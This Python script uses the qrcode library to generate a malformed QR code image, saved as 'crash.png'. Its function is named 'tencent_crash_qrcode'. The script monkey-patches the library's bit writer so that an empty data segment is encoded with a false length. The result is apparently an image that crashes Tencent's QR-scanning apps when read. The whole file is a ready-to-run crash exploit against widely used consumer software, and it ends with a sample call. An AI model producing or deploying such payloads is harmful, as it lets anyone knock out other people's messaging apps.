import qrcode
from qrcode.util import QRData, MODE_8BIT_BYTE

NUM_BLOCKS = [19, 34, 55, 80, 108, 136, 156, 194, 232]


def tencent_crash_qrcode(message: str, filename='crash.png'):

    def hack_put(self, num, length):
        if num == 0:
            num = 1
        for i in range(length):
            self.put_bit(((num >> (length - i - 1)) & 1) == 1)

    data = message.encode('utf-8')
    data_len = len(data)

    version = 1
    while version <= len(NUM_BLOCKS) and data_len + 3 > NUM_BLOCKS[version-1]:
        version += 1
    if version > len(NUM_BLOCKS):
        raise Exception('message too long')

    data += b' ' * (NUM_BLOCKS[version-1] - data_len - 3)

    print(data_len, version)
    qr = qrcode.QRCode(version, qrcode.constants.ERROR_CORRECT_L)

    comm_data = QRData(data, MODE_8BIT_BYTE)
    hack_data = QRData(b'', MODE_8BIT_BYTE)

    qr.add_data(comm_data, 0)
    qr.add_data(hack_data, 0)

    original_put = qrcode.util.BitBuffer.put
    qrcode.util.BitBuffer.put = hack_put
    qr.make_image().save(filename)
    qrcode.util.BitBuffer.put = original_put


tencent_crash_qrcode('KFCVW50')
